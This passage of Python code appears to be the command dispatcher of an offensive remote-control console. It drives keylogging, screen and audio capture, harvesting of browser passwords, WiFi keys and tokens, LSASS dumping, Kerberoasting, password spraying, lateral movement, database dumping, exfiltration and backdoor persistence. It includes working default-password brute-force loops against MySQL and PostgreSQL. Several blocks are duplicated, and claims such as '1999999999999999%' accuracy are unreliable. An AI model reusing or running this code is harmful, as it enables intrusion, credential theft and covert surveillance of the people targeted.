                        print(f"  {Fore.BLUE}{'─'*50}")
                        for ssid, pw in networks.items():
                            print(f"  {Fore.GREEN}{Style.BRIGHT}  {ssid:<30} {Fore.WHITE}→ {pw}")
                        print(f"  {Fore.BLUE}{'─'*50}\n")
                    else:
                        print(f"  {Fore.YELLOW}No WiFi profiles found or no permission.")
                    if result.get("error"):
                        print(f"  {Fore.RED}Error: {result['error']}")
                else:
                    Visualizer.alert("Control module not loaded", "warn")
        
            elif cmd == "monitor" or cmd == "live":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                duration = int(args[1]) if len(args) > 1 else 60
                print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  LIVE MONITORING ACTIVATED ON {target}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Screen stream active")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Keylogger active")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Audio capture active")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Duration: {duration} seconds")
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                
                if self.control:
                    self.control.live_monitor(target, self.credentials["user"], self.credentials["pass"], duration)
        
            elif cmd == "extract" or cmd == "harvest":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  FULL DATA EXTRACTION FROM {target}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    data = self.control.extract_all_data(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser passwords: {len(data.get('credentials', []))}")
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ WiFi networks: {len(data.get('wifi', {}))}")
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Cookies extracted")
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser history: {len(data.get('browser_data', {}))}")
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "file":
                if len(args) < 2:
                    print(f"{Fore.RED}Usage: file <list|upload|download|delete|execute> [path]")
                    return
                target = self.selected_target
                action = args[0]
                path = " ".join(args[1:])
                
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                
                if self.control:
                    result = self.control.remote_file_manager(target, 
                        self.credentials["user"], 
                        self.credentials["pass"], 
                        action, path)
                    print(f"{Fore.GREEN}{json.dumps(result, indent=2)}")
        
            elif cmd == "media":
                if len(args) < 1:
                    print(f"{Fore.RED}Usage: media <play|volume_up|volume_down|open_url|cd_open> [file/url]")
                    return
                target = self.selected_target
                action = args[0]
                file = args[1] if len(args) > 1 else None
                
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                
                if self.control:
                    self.control.remote_media_control(target,
                        self.credentials["user"],
                        self.credentials["pass"],
                        action, file)
                print(f"{Fore.GREEN}✅ Media command sent: {action}")

            elif cmd in ("nopac", "no-pac") and args:
                target = args[0]
                Visualizer.alert(f"NoPac (CVE-2021-42278) AD check on {target} - checking SMB+LDAP...", "hack")
                if self.control and hasattr(self.control, 'smb_check_vulns'):
                    sv = self.control.smb_check_vulns(target)
                    vulns = sv.get("vulns", [])
                    is_dc = any("DOMAIN_CONTROLLER" in v or "LDAP" in v for v in vulns)
                    print(f"\n  {Fore.RED if is_dc else Fore.YELLOW}{Style.BRIGHT}  CVE-2021-42278 (NoPac)  │  {'DOMAIN CONTROLLER CANDIDATE' if is_dc else 'Not a detected DC'}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  SMB vulns found: {', '.join(vulns) or 'none'}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("smbghost", "smb-ghost") and args:
                target = args[0]
                Visualizer.alert(f"SMBGhost (CVE-2020-0796) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_smbghost'):
                    result = self.control.check_smbghost(target)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-0796 (SMBGhost)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("printnightmare", "print-nightmare") and args:
                target = args[0]
                Visualizer.alert(f"PrintNightmare (CVE-2021-34527) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_printnightmare'):
                    result = self.control.check_printnightmare(
                        target,
                        self.credentials["user"],
                        self.credentials["pass"]
                    )
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-34527 (PrintNightmare)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("petitpotam", "petit-potam") and args:
                target = args[0]
                Visualizer.alert(f"PetitPotam (CVE-2021-36942) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_petitpotam'):
                    result = self.control.check_petitpotam(target)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE (unauthenticated NTLM coercion possible)" if vuln else "NOT VULNERABLE"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-36942 (PetitPotam)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("zerologon", "zero-logon") and args:
                target = args[0]
                dc_name = args[1] if len(args) > 1 else ""
                Visualizer.alert(f"Zerologon (CVE-2020-1472) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_zerologon'):
                    result = self.control.check_zerologon(target, dc_name)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "NETLOGON REACHABLE — check patch level" if vuln else "NOT REACHABLE"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-1472 (Zerologon)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")
        
            elif cmd in ("mobile", "phone"):
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'mobile <ip>'")
                    return
            
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  MOBILE DEVICE EXPLOITATION: {target}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
            
                if self.control:
                    result = self.control.mobile_exploit_auto(target)
                    if result.get('success'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ MOBILE EXPLOIT SUCCESS")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Device type: {result.get('type')}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Control level: {result.get('control')}")
                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                else:
                    print(f"{Fore.RED}  ❌ Mobile exploit failed")
        
            elif cmd == "globalscan":
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  ULTRAMAX GLOBAL NETWORK SCAN ACTIVATED")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Scanning ALL networks within 10km radius")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ PAN/Bluetooth/WiFi Direct detection active")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Mobile device auto-exploitation enabled")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Accuracy: 1999999999999999%")
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                HackerSounds.alert()
                if self.discovery:
                    self.discovery.ultramax_global_scan()
        
            elif cmd == "kerberoast" and args:
                dc_ip = args[0]
                domain = args[1] if len(args) > 1 else ""
                
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  KERBEROASTING ATTACK ON {dc_ip}")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.kerberoast(dc_ip, domain)
                    if result.get('success'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ KERBEROAST SUCCESSFUL")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SPNs found: {len(result.get('spn_found', []))}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tickets extracted: {len(result.get('tickets_extracted', []))}")
                    else:
                        print(f"{Fore.RED}  ❌ Kerberoasting failed")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "password-spray" and len(args) >= 1:
                domain = args[0]
                 
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  PASSWORD SPRAY ATTACK ON DOMAIN: {domain}")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                 
                if self.control:
                    users = ["administrator", "user", "admin", "guest"]
                    passwords = ["Password123!", "password", "admin", "123456"]
                    result = self.control.password_spray(domain, users, passwords)
                     
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Attempts made: {result.get('attempts', 0)}")
                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Valid credentials: {len(result.get('valid_credentials', []))}")
                    for cred in result.get('valid_credentials', []):
                        print(f"{Fore.GREEN}    ✅ {cred}")
                     
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "lateral" and len(args) >= 2:
                source = args[0]
                target = args[1]
                 
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  LATERAL MOVEMENT: {source} → {target}")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                 
                if self.control:
                    result = self.control.lateral_movement(source, target, self.credentials)
                    if result.get('success'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ LATERAL MOVEMENT SUCCESSFUL")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Method used: {result.get('method_used')}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Session created: {result.get('session_created')}")
                    else:
                        print(f"{Fore.RED}  ❌ All methods failed")
                        print(f"{Fore.YELLOW}  ⚠ Attempted: {', '.join(result.get('methods_attempted', []))}")
                 
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "db-dump" and len(args) >= 3:
                ip = args[0]
                port = int(args[1])
                db_type = args[2]
                user = args[3] if len(args) > 3 else ""
                pwd = args[4] if len(args) > 4 else ""
                 
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  FULL DATABASE DUMP: {db_type.upper()} {ip}:{port}")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                 
                if self.control:
                    result = self.control.full_database_dump(ip, port, db_type, user, pwd)
                    if result.get('connected'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables extracted: {result.get('tables_extracted', 0)}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Total rows: {result.get('total_rows', 0)}")
                    else:
                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
                 
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "exfiltrate" and len(args) >= 2:
                target = args[0]
                file_path = args[1]
                 
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  DATA EXFILTRATION")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                 
                if self.control:
                    result = self.control.data_exfiltration(target, file_path)
                    if result.get('success'):
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ EXFILTRATION COMPLETE")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Bytes transferred: {result.get('bytes_transferred', 0)}")
                    else:
                        print(f"{Fore.RED}  ❌ Exfiltration failed")
                 
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "db-extract" and len(args) >= 3:
                ip = args[0]
                port = int(args[1])
                db_type = args[2]
                user = args[3] if len(args) > 3 else ""
                pwd = args[4] if len(args) > 4 else ""
                 
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  DATABASE EXTRACTION: {db_type.upper()} {ip}:{port}")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                 
                if self.control:
                    result = self.control.database_extract(ip, port, db_type, user, pwd)
                    if result.get('connected'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables found: {len(result.get('tables', []))}")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Rows extracted: {result.get('total_rows', 0)}")
                    else:
                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
                 
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "cloud-attack" and len(args) >= 2:
                service_type = args[0]
                target = args[1]
                 
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  CLOUD SERVICE ATTACK: {service_type.upper()}")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                 
                if self.control:
                    result = self.control.cloud_service_attack(service_type, target)
                    if result.get('vulnerable'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ VULNERABILITY DETECTED")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Data accessible: {result.get('data_accessible')}")
                    else:
                        print(f"{Fore.YELLOW}  ⚠ Service not vulnerable")
                 
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "persist":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  PERSISTENT BACKDOOR INSTALLATION")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.establish_persistent_connection(target, 
                        self.credentials["user"], 
                        self.credentials["pass"])
                    
                    if result.get('backdoor_active'):
                        HackerSounds.exploit_success()
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ BACKDOOR INSTALLED")
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Methods: {', '.join(result.get('persistence_installed', []))}")
                    else:
                        print(f"{Fore.RED}  ❌ Persistence installation failed")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd == "sysinfo" or cmd == "systeminfo":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'sysinfo <ip>'")
                    return
                
                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  FULL SYSTEM INFORMATION: {target}")
                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
                
                if self.control:
                    result = self.control.get_full_system_info(target, 
                        self.credentials["user"], 
                        self.credentials["pass"])
                    
                    if result.get('success'):
                        info = result.get('system_info', {})
                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SYSTEM INFO EXTRACTED")
                        print(f"\n{Fore.LIGHTGREEN_EX}  ──────────────────────────────────────────────")
                        print(f"{Fore.GREEN}  Hostname:        {Fore.WHITE}{info.get('hostname', 'N/A')}")
                        print(f"{Fore.GREEN}  OS:              {Fore.WHITE}{info.get('os_name', 'N/A')}")
                        print(f"{Fore.GREEN}  OS Version:      {Fore.WHITE}{info.get('os_version', 'N/A')}")
                        print(f"{Fore.GREEN}  Architecture:    {Fore.WHITE}{info.get('os_architecture', 'N/A')}")
                        print(f"{Fore.GREEN}  Processor:       {Fore.WHITE}{info.get('processor', 'N/A')}")
                        print(f"{Fore.GREEN}  CPU Cores:       {Fore.WHITE}{info.get('processor_cores', 'N/A')}")
                        print(f"{Fore.GREEN}  Total RAM:       {Fore.WHITE}{info.get('ram_total', 0)} MB")
                        print(f"{Fore.GREEN}  Used RAM:        {Fore.WHITE}{info.get('ram_used', 0)} MB")
                        print(f"{Fore.GREEN}  Free RAM:        {Fore.WHITE}{info.get('ram_free', 0)} MB")
                        print(f"{Fore.GREEN}  Total Disk:      {Fore.WHITE}{info.get('disk_total', 0)} GB")
                        print(f"{Fore.GREEN}  Free Disk:       {Fore.WHITE}{info.get('disk_free', 0)} GB")
                        print(f"{Fore.GREEN}  MAC Address:     {Fore.WHITE}{info.get('mac_address', 'N/A')}")
                        print(f"{Fore.GREEN}  Last Boot:       {Fore.WHITE}{info.get('last_boot', 'N/A')}")
                        print(f"{Fore.GREEN}  Logged Users:    {Fore.WHITE}{', '.join(info.get('logged_users', []))}")
                        print(f"{Fore.GREEN}  Domain:          {Fore.WHITE}{info.get('domain', 'N/A')}")
                        print(f"{Fore.LIGHTGREEN_EX}  ──────────────────────────────────────────────")
                    else:
                        print(f"{Fore.RED}  ❌ Failed to extract system information")
                
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")

            elif cmd == "lsass-dump":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'lsass-dump <ip>'.")
                    return
                
                Visualizer.alert(f"Dumping LSASS on {target} via comsvcs.dll MiniDump ...", "hack")
                if self.control and hasattr(self.control, 'lsass_dump'):
                    result = self.control.lsass_dump(target, self.credentials["user"], self.credentials["pass"])
                    if result.get("success"):
                        print(f"\n  {Fore.RED}{Style.BRIGHT}✔  LSASS Dumped Successfully")
                        print(f"  {Fore.WHITE}  Remote path : {result['path']}")
                        print(f"  {Fore.WHITE}  UNC path    : {result['unc']}")
                        print(f"  {Fore.WHITE}  Size        : {result.get('size_bytes','?')} bytes")
                        print(f"\n  {Fore.YELLOW}  Use SMB download to retrieve: smb-download {target} C$ Windows/Temp/lsass.dmp\n")
                    else:
                        print(f"\n  {Fore.RED}✘  LSASS dump failed: {result.get('error','unknown')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "tokens":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'tokens <ip>'.")
                    return
                
                Visualizer.alert(f"Harvesting auth tokens from {target} ...", "hack")
                if self.control and hasattr(self.control, 'steal_saved_credentials'):
                    result = self.control.steal_saved_credentials(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{Fore.CYAN}\n  Token/Credential harvest results:")
                    print(json.dumps(result, indent=2))
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "mysql-root" and args:
                target = args[0]
                Visualizer.alert(f"Trying MySQL root access on {target}:3306 ...", "hack")
                result = {"target": target, "port": 3306, "attempts": []}
                try:
                    import pymysql
                    for pw in ["", "root", "password", "admin", "mysql", "toor", "123456"]:
                        try:
                            conn = pymysql.connect(host=target, user='root', password=pw, connect_timeout=3, db='information_schema')
                            cur = conn.cursor()
                            cur.execute("SELECT user, host, authentication_string FROM mysql.user")
                            users = cur.fetchall()
                            result["success"] = True
                            result["password"] = pw if pw else "(empty)"
                            result["users"] = [{"user": r[0], "host": r[1]} for r in users]
                            cur.execute("SHOW DATABASES")
                            result["databases"] = [r[0] for r in cur.fetchall()]
                            conn.close()
                            
                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  MySQL root ACCESS on {target}  │  password='{pw if pw else '(empty)'}'")
                            print(f"  {Fore.WHITE}  Databases: {', '.join(result['databases'])}")
                            print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
                            break
                        except Exception as e2:
                            result["attempts"].append({"password": pw or "(empty)", "error": str(e2)})
                    if not result.get("success"):
                        print(f"  {Fore.GREEN}MySQL root access failed — all passwords rejected.")
                except ImportError:
                    try:
                        s = socket.socket()
                        s.settimeout(3)
                        r = s.connect_ex((target, 3306))
                        s.close()
                        state = "OPEN" if r == 0 else "CLOSED"
                        print(f"\n  {Fore.YELLOW}  MySQL port 3306: {state} (install pymysql for full exploit)\n")
                        result["port_state"] = state
                    except Exception as e:
                        result["error"] = str(e)
                        print(f"{json.dumps(result, indent=2)}")

            elif cmd == "postgres" and args:
                target = args[0]
                Visualizer.alert(f"Trying PostgreSQL access on {target}:5432 ...", "hack")
                result = {"target": target, "port": 5432, "attempts": []}
                try:
                    import psycopg2
                    for user_pw in [("postgres",""), ("postgres","postgres"), ("postgres","password"), ("admin","admin")]:
                        u, pw = user_pw
                        try:
                            conn = psycopg2.connect(host=target, user=u, password=pw, dbname='postgres', connect_timeout=3)
                            cur = conn.cursor()
                            cur.execute("SELECT usename, usesuper FROM pg_user")
                            users = cur.fetchall()
                            cur.execute("SELECT datname FROM pg_database WHERE datistemplate=false")
                            dbs = [r[0] for r in cur.fetchall()]
                            result["success"] = True
                            result["user"] = u
                            result["password"] = pw if pw else "(empty)"
                            result["databases"] = dbs
                            result["users"] = [{"user":r[0],"superuser":r[1]} for r in users]
                            conn.close()
                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  PostgreSQL ACCESS on {target}  │  {u}:'{pw if pw else '(empty)'}'")
                            print(f"  {Fore.WHITE}  Databases: {', '.join(dbs)}")
                            print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
                            break
                        except Exception as e2:
                            result["attempts"].append({"user": u, "password": pw or "(empty)", "error": str(e2)})
                    if not result.get("success"):
                        print(f"  {Fore.GREEN}PostgreSQL access failed — all credentials rejected.")
                except ImportError:
                    try:
                        s = socket.socket()
                        s.settimeout(3)
                        r = s.connect_ex((target, 5432))
                        s.close()
                        state = "OPEN" if r == 0 else "CLOSED"
                        print(f"\n  {Fore.YELLOW}  PostgreSQL port 5432: {state} (install psycopg2 for full exploit)\n")
                        result["port_state"] = state
                    except Exception as e:
                        result["error"] = str(e)
                        print(f"{json.dumps(result, indent=2)}")

            elif cmd == "s3-scan" and args:
                bucket = args[0]
                Visualizer.alert(f"Scanning S3 bucket: {bucket}", "hack")
                import urllib.request
                result = {"bucket": bucket, "public": False, "objects": []}
                try:
                    # Try public bucket access
                    req = urllib.request.Request(f"https://{bucket}.s3.amazonaws.com/")
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        if resp.status == 200:
                            result["public"] = True
                            content = resp.read().decode('utf-8', errors='ignore')
                            if "<ListBucketResult" in content:
                                result["objects"] = re.findall(r'<Key>(.*?)</Key>', content)[:20]
                    print(f"\n  {Fore.GREEN if result['public'] else Fore.YELLOW}  Bucket {bucket}: {'PUBLICLY ACCESSIBLE' if result['public'] else 'Not public'}")
                    if result['objects']:
                        print(f"  {Fore.WHITE}  Public objects: {len(result['objects'])}")
                        for obj in result['objects'][:10]:
                            print(f"    - {obj}")
                        print()
                except Exception as e:
                    print(f"  {Fore.RED}Scan failed: {e}")
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "scan-exploit" and args:
                ip_range = args[0]
                Visualizer.alert(f"Scan & exploit all hosts in {ip_range} ...", "hack")
                if self.control and hasattr(self.control, 'scan_and_exploit_network'):
                    result = self.control.scan_and_exploit_network(ip_range)
                    total = result.get("total_scanned", 0)
                    owned = result.get("owned", 0)
                    print(f"\n  {Fore.RED}{Style.BRIGHT}Scan-Exploit complete:")
                    print(f"  {Fore.WHITE}  Hosts scanned : {total}")
                    print(f"  {Fore.GREEN}{Style.BRIGHT}  Owned         : {owned}")
                    hosts = result.get("hosts", [])
                    for h in hosts:
                        col = Fore.RED if h.get("owned") else Fore.WHITE
                        print(f"  {col}  {h.get('ip','?'):<16} {h.get('method','')}")
                    print()
                elif self.universal:
                    result = self.universal.discover_all_devices(ip_range)
                    print(f"\n  Found {len(result)} hosts in {ip_range}")
                    for d in result:
                        print(f"  {Fore.CYAN}  {d.ip:<16} {getattr(d,'hostname','') or ''}")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            # ==================== WIN10/11 EXPLOITS ====================
            elif cmd == "smbghost" and args:
                target = args[0]
                Visualizer.alert(f"SMBGhost (CVE-2020-0796) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_smbghost'):
                    result = self.control.check_smbghost(target)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-0796 (SMBGhost)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "printnightmare" and args:
                target = args[0]
                Visualizer.alert(f"PrintNightmare (CVE-2021-34527) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_printnightmare'):
                    result = self.control.check_printnightmare(
                        target,
                        self.credentials["user"],
                        self.credentials["pass"]
                    )
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-34527 (PrintNightmare)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "petitpotam" and args:
                target = args[0]
                Visualizer.alert(f"PetitPotam (CVE-2021-36942) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_petitpotam'):
                    result = self.control.check_petitpotam(target)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE (unauthenticated NTLM coercion possible)" if vuln else "NOT VULNERABLE"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-36942 (PetitPotam)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd == "zerologon" and args:
                target = args[0]
                dc_name = args[1] if len(args) > 1 else ""
                Visualizer.alert(f"Zerologon (CVE-2020-1472) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'check_zerologon'):
                    result = self.control.check_zerologon(target, dc_name)
                    vuln = result.get("vulnerable", False)
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "NETLOGON REACHABLE — check patch level" if vuln else "NOT REACHABLE"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-1472 (Zerologon)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("nopac",) and args:
                target = args[0]
                Visualizer.alert(f"NoPac (CVE-2021-42278) AD check on {target} - checking SMB+LDAP...", "hack")
                if self.control and hasattr(self.control, 'smb_check_vulns'):
                    sv = self.control.smb_check_vulns(target)
                    vulns = sv.get("vulns", [])
                    is_dc = any("DOMAIN_CONTROLLER" in v or "LDAP" in v for v in vulns)
                    print(f"\n  {Fore.RED if is_dc else Fore.YELLOW}{Style.BRIGHT}  CVE-2021-42278 (NoPac)  │  {'DOMAIN CONTROLLER CANDIDATE' if is_dc else 'Not a detected DC'}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  SMB vulns found: {', '.join(vulns) or 'none'}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("winrm-exec",) and len(args) >= 2:
                target = args[0]
                command = " ".join(args[1:])
                port = self.credentials.get("winrm_port", 5985)
                Visualizer.alert(f"WinRM exec on {target}:{port} → {command[:60]}", "hack")
                if self.control and hasattr(self.control, 'winrm_exec'):
                    result = self.control.winrm_exec(
                        target, self.credentials["user"], self.credentials["pass"],
                        command, port=port
                    )
                    if result.get("success"):
                        print(f"\n  {Fore.GREEN}{Style.BRIGHT}✔  WinRM Success on {target}")
                        print(f"  {Fore.WHITE}Output:\n{result.get('output','')}")
                    else:
                        print(f"\n  {Fore.RED}{Style.BRIGHT}✘  WinRM Failed: {result.get('error','unknown')}")
                    if result.get("error_detail"):
